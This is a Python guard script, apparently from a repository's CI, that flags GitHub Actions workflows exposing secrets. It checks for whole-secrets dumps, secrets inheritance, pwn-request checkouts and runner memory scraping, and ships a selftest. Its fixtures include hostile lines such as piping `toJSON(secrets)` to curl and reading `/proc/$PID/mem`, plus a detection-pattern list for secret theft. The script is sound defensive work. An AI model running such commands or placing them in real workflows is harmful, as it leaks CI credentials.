#!/usr/bin/env python3
"""Fail on workflow patterns that hand CI secrets to code we did not review.

Why this exists (2026-11-12)
----------------------------
The "wfx" GitHub Actions campaign (StepSecurity, Endor Labs, SafeDep, Aikido;
IOCs from 2026-11-10) used ~4,800 hijacked accounts to push a workflow that runs
`${{ toJSON(secrets) }}`, reads the runner's process memory, exfiltrates it and
then deletes its own run logs. Our sweep of every repo found no indicator, but
nothing mechanical stopped that shape from landing here: the SHA-pin guard
checks `uses:` refs only, and a payload in a `run:` step pins nothing.

Rules (each is a pattern that exposes MORE than the step needs):
  1. `toJSON(secrets)` or a bare `${{ secrets }}`  — dumps every secret at once.
  2. `secrets: inherit`                            — passes every secret to a called workflow.
  3. `pull_request_target`                         — base-repo token + secrets on PR events.
  4. a `workflow_run`/`pull_request_target` file that references the triggering
     head anywhere (`ref:` key or a `git checkout` in `run:`) — runs
     untrusted code with privileged credentials ("pwn request").
  5. process-memory reads (`/proc/<pid>/mem`, `Runner.Worker|Listener`, `gcore`,
     `process_vm_readv`) — the stealer's
     secret-scraping technique; nothing legitimate here needs it.
  6. a workflow file named `build-audit-<6 chars>.yml` — the campaign's own name.

Scope: tracked `.github/workflows/*.y[a]ml` and `.github/actions/**/action.y[a]ml`.
Escape hatch: a line ending in `# workflow-secret-ok: <reason>` waives ONLY rules 2 and 3
(they have legitimate uses). Rules 1, 5 and 6 cannot be waived: whoever writes a payload
can also write the hatch. Rule 1 also covers any `${{ … }}` (multi-line too) naming
`secrets` other than as `secrets.NAME` (`secrets[...]`, `join(secrets)`, `secrets.*`).

This guard is a tripwire for a reviewed tree. It does NOT stop an attacker who
holds a push token — they push past every hook. That threat is closed by account
and repository settings (see the PR description), not by this file.

Exit codes: 0 clean, 1 violation(s), 2 unrecognised flag.
`--selftest` runs 23 named violations and 16 named clean files and asserts each verdict.
"""

from __future__ import annotations

import re
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]

OK_MARK = re.compile(r"#\s*workflow-secret-ok:\s*\S")
# (rule, pattern, may the escape hatch waive it?) Only rules with a legitimate use are
# waivable; a dump or a memory read has none, and whoever writes the payload could also
# write the hatch (blind review High-1).
LINE_RULES: list[tuple[str, re.Pattern[str], bool]] = [
    (
        "whole secrets object",
        re.compile(r"toJSON\s*\(\s*secrets\s*\)", re.IGNORECASE),
        False,
    ),
    ("secrets: inherit", re.compile(r"^\s*secrets\s*:\s*['\"]?inherit\b"), True),
    ("pull_request_target trigger", re.compile(r"\bpull_request_target\b"), True),
    (
        "process-memory read",
        re.compile(
            r"/proc/[^\s/]+/mem\b|Runner\.(Worker|Listener)|\bgcore\b|process_vm_readv",
            re.IGNORECASE,
        ),
        False,
    ),
]
# Any `${{ … }}` (multi-line too) that names `secrets` other than as `secrets.NAME`:
# `${{ secrets }}`, `secrets[matrix.k]`, `join(secrets)`, `secrets.*` all hand over
# every secret, exactly like toJSON(secrets) (blind review High-2, Medium-1).
EXPR = re.compile(r"\$\{\{.*?\}\}", re.DOTALL)
WHOLE_SECRETS = re.compile(
    r"\bsecrets\b(?!\s*\.\s*[A-Za-z_][A-Za-z0-9_-]*)", re.IGNORECASE
)
PRIVILEGED = re.compile(r"\b(workflow_run|pull_request_target)\s*:")
# The triggering head, anywhere on a code line (a `ref:` key or a `git checkout` in run:).
HEAD_CHECKOUT = re.compile(
    r"(workflow_run\.head_(sha|branch)|pull_request\.head\.(sha|ref))", re.IGNORECASE
)
IOC_NAME = re.compile(r"^build-audit-[a-z0-9]{6}\.ya?ml$")


def targets() -> list[Path]:
    out = subprocess.run(
        [
            "git",
            "ls-files",
            ".github/workflows/*.yml",
            ".github/workflows/*.yaml",
            ".github/actions/*/action.yml",
            ".github/actions/*/action.yaml",
        ],
        cwd=ROOT,
        capture_output=True,
        text=True,
        check=True,
    )
    return [ROOT / p for p in out.stdout.split("\n") if p.strip()]


def scan(path: Path) -> list[tuple[int, str]]:
    """Return [(lineno, rule)] for every violation in one file."""
    text = path.read_text(encoding="utf-8")
    bad: list[tuple[int, str]] = []
    if IOC_NAME.match(path.name):
        bad.append((0, "campaign IOC file name build-audit-xxxxxx.yml"))
    privileged = bool(PRIVILEGED.search(text))
    lines = text.split("\n")
    for m in EXPR.finditer(text):
        lineno = text.count("\n", 0, m.start()) + 1
        # A hash-prefixed line may be shell heredoc data inside a YAML block scalar.
        # Conservatively reject whole-secret expressions even in apparent comments.
        if WHOLE_SECRETS.search(m.group(0)):
            bad.append((lineno, "whole secrets object"))
    for i, line in enumerate(lines, start=1):
        # Skip only whole-line comments. A trailing comment is NOT stripped: `#` inside a
        # `run:` string would otherwise truncate the scan (`echo "#x ${{ toJSON(secrets) }}"`).
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        waived = bool(OK_MARK.search(line))
        for name, rx, waivable in LINE_RULES:
            if rx.search(line) and not (waived and waivable):
                bad.append((i, name))
        if privileged and HEAD_CHECKOUT.search(line):
            bad.append((i, "privileged trigger checks out the untrusted head"))
    return sorted(set(bad))


def run(files: list[Path], base: Path = ROOT) -> int:
    n = 0
    for f in files:
        for lineno, rule in scan(f):
            print(f"{f.relative_to(base)}:{lineno}: {rule}", file=sys.stderr)
            n += 1
    if n:
        print(
            f"\n{n} secret-exposure pattern(s). Pass each step only the secrets it\n"
            "needs (`env: X: ${{ secrets.X }}`). Only `secrets: inherit` and\n"
            "`pull_request_target` may be waived, with `# workflow-secret-ok: <reason>`.",
            file=sys.stderr,
        )
        return 1
    print(f"workflow secret exposure: clean ({len(files)} file(s))")
    return 0


SHA = "a" * 40
# (test name, file name, body, rule it must report) — each runs as `--selftest::<name>`.
BAD = [
    (
        "secrets_in_hash_prefixed_heredoc_payload",
        "heredoc.yml",
        "steps:\n  - run: |\n      cat <<EOF\n      # ${{ toJSON(secrets) }}\n      EOF\n",
        "whole secrets object",
    ),
    (
        "flow_style_privileged_trigger",
        "flow.yml",
        "on: {workflow_run: {workflows: [CI], types: [completed]}}\n"
        "steps:\n  - uses: actions/checkout@" + SHA + "\n"
        "    with:\n      ref: ${{ github.event.workflow_run.head_sha }}\n",
        "privileged trigger checks out the untrusted head",
    ),
    (
        "dump_tojson_secrets",
        "dump.yml",
        "      - run: echo '${{ toJSON(secrets) }}' | curl -d @- x\n",
        "whole secrets object",
    ),
    (
        "dump_case_and_spacing",
        "case.yml",
        "      - run: echo '${{ ToJson( secrets ) }}'\n",
        "whole secrets object",
    ),
    (
        "dump_bare_secrets_object",
        "bare.yml",
        "        env: { S: '${{ secrets }}' }\n",
        "whole secrets object",
    ),
    (
        "dump_after_hash_in_string",
        "hashed.yml",
        '      - run: echo "#x ${{ toJSON(secrets) }}"\n',
        "whole secrets object",
    ),
    (
        "dump_in_composite_action",
        "action.yml",
        "runs:\n  steps:\n    - run: echo '${{ toJSON(secrets) }}'\n",
        "whole secrets object",
    ),
    ("secrets_inherit", "inherit.yml", "    secrets: inherit\n", "secrets: inherit"),
    (
        "pull_request_target_trigger",
        "prt.yml",
        "on:\n  pull_request_target:\n",
        "pull_request_target trigger",
    ),
    (
        "proc_mem_read",
        "mem.yml",
        "      - run: cat /proc/$PID/mem > m\n",
        "process-memory read",
    ),
    (
        "runner_worker_scrape",
        "rw.yml",
        "      - run: pgrep Runner.Worker\n",
        "process-memory read",
    ),
    (
        "workflow_run_head_sha_checkout",
        "pwn.yml",
        "on:\n  workflow_run:\n    workflows: [ci]\n"
        "      - uses: actions/checkout@"
        + SHA
        + "\n        with:\n          ref: ${{ github.event.workflow_run.head_sha }}\n",
        "privileged trigger checks out the untrusted head",
    ),
    (
        "prt_head_ref_checkout",
        "prt2.yml",
        (
            "on:\n  pull_request_target:\n"
            "        with:\n          ref: ${{ github.event.pull_request.head.ref }}\n"
        ),
        "privileged trigger checks out the untrusted head",
    ),
    (
        "campaign_ioc_filename",
        "build-audit-x82c1a.yml",
        "name: Dependency Audit\n",
        "campaign IOC file name",
    ),
    (
        "dump_with_hatch_still_reported",
        "hd.yml",
        "      - run: echo ${{ toJSON(secrets) }} # workflow-secret-ok: x\n",
        "whole secrets object",
    ),
    (
        "memory_read_with_hatch_still_reported",
        "hm.yml",
        "      - run: cat /proc/1/mem # workflow-secret-ok: x\n",
        "process-memory read",
    ),
    (
        "dynamic_index_secrets",
        "dyn.yml",
        "        env:\n          V: ${{ secrets[matrix.k] }}\n",
        "whole secrets object",
    ),
    (
        "join_secrets",
        "join.yml",
        "      - run: echo '${{ join(secrets) }}'\n",
        "whole secrets object",
    ),
    (
        "secrets_star",
        "star.yml",
        "      - run: echo '${{ secrets.* }}'\n",
        "whole secrets object",
    ),
    (
        "tojson_split_across_lines",
        "ml.yml",
        "      - run: echo '${{ toJSON(\n          secrets) }}'\n",
        "whole secrets object",
    ),
    (
        "git_checkout_head_in_run",
        "gc.yml",
        (
            "on:\n  workflow_run:\n    workflows: [ci]\n"
            "      - run: git checkout ${{ github.event.workflow_run.head_sha }}\n"
        ),
        "privileged trigger checks out the untrusted head",
    ),
    (
        "quoted_secrets_inherit",
        "qi.yml",
        "    secrets: 'inherit'\n",
        "secrets: inherit",
    ),
    (
        "runner_listener_scrape",
        "rl.yml",
        "      - run: pgrep Runner.Listener\n",
        "process-memory read",
    ),
]
CLEAN = [
    (
        "single_secret_env",
        "env.yml",
        "      - run: x\n        env:\n          K: ${{ secrets.K }}\n",
    ),
    (
        "github_token_secret",
        "tok.yml",
        "        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
    ),
    (
        "explicit_secret_map_to_reusable",
        "map.yml",
        "    secrets:\n      K: ${{ secrets.K }}\n",
    ),
    (
        "whole_line_comment",
        "c.yml",
        "# a comment that mentions toJSON(secrets) is not code\non: push\n",
    ),
    ("tojson_github_context", "gh.yml", "      - run: echo '${{ toJSON(github) }}'\n"),
    ("tojson_steps_context", "st.yml", "      - run: echo '${{ toJSON(steps) }}'\n"),
    ("pull_request_trigger", "pr.yml", "on:\n  pull_request:\n"),
    (
        "workflow_run_default_checkout",
        "wr.yml",
        "on:\n  workflow_run:\n    workflows: [ci]\n"
        "      - uses: actions/checkout@" + SHA + "\n",
    ),
    (
        "workflow_run_fixed_ref",
        "wr2.yml",
        "on:\n  workflow_run:\n    workflows: [ci]\n        with:\n          ref: main\n",
    ),
    (
        "head_ref_without_privileged_trigger",
        "pr2.yml",
        "on:\n  pull_request:\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n",
    ),
    ("proc_cpuinfo_read", "cpu.yml", "      - run: cat /proc/cpuinfo\n"),
    (
        "escape_hatch_with_reason",
        "hatch.yml",
        "    secrets: inherit  # workflow-secret-ok: local reusable workflow, reviewed\n",
    ),
    ("non_ioc_build_audit_name", "build-audit.yml", "on: push\n"),
    (
        "two_named_secrets_in_one_expression",
        "or.yml",
        "        env:\n          K: ${{ secrets.A || secrets.B }}\n",
    ),
    (
        "prt_with_hatch_waived",
        "ph.yml",
        "on:\n  pull_request_target:  # workflow-secret-ok: labels only, no checkout\n",
    ),
    (
        "workflow_run_id_not_head",
        "wid.yml",
        "on:\n  workflow_run:\n    workflows: [ci]\n        env:\n          ID: ${{ github.event.workflow_run.id }}\n",
    ),
]


def selftest() -> int:
    with tempfile.TemporaryDirectory() as td:
        tmp = Path(td)
        for name, fname, body, rule in BAD:
            p = tmp / name / fname
            p.parent.mkdir()
            p.write_text(body, encoding="utf-8")
            hits = [r for _, r in scan(p)]
            if not any(h.startswith(rule) for h in hits):
                print(
                    f"✗ selftest::{name}: not reported as '{rule}' (got {hits}) — guard is decorative",
                    file=sys.stderr,
                )
                return 1
            print(f"✓ selftest::{name} → {rule}")
        for name, fname, body in CLEAN:
            p = tmp / name / fname
            p.parent.mkdir()
            p.write_text(body, encoding="utf-8")
            if scan(p):
                print(
                    f"✗ selftest::{name}: clean file was reported: {scan(p)}",
                    file=sys.stderr,
                )
                return 1
            print(f"✓ selftest::{name} passes")
    return 0


def main(argv: list[str]) -> int:
    if argv == ["--selftest"]:
        return selftest()
    if argv:
        print(
            f"unrecognised argument(s): {' '.join(argv)} (only --selftest)",
            file=sys.stderr,
        )
        return 2
    return run(targets())


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
